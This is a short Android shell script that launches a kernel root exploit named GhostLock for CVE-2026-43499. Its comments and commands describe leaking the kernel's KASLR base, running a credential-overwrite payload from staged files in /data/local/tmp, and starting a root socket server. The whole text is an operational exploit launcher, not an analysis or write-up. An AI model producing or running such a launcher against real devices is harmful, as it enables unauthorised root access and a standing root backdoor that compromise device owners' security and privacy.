#!/system/bin/sh
# Self-contained per-boot GhostLock launcher. Run as shell (uid 2000).
# It leaks the current KASLR base, derives the boot's P0 at runtime, runs the
# cred-only payload, and starts the root socket server. Files persist across
# reboot; root/state do not. Do not run as an app UID.
set -u
DIR=/data/local/tmp
: "${GHOSTLOCK_ROOT_SOCKET:=ghostlock-root}"
export GHOSTLOCK_ROOT_SOCKET
unset KASLR_BASE
exec "$DIR/cve-2026-43499-root" \
  --run-payload "$DIR/ghostlock-cred-only.so" \
  "$DIR/cve-2026-43499-root" "$DIR/cred_only.log"
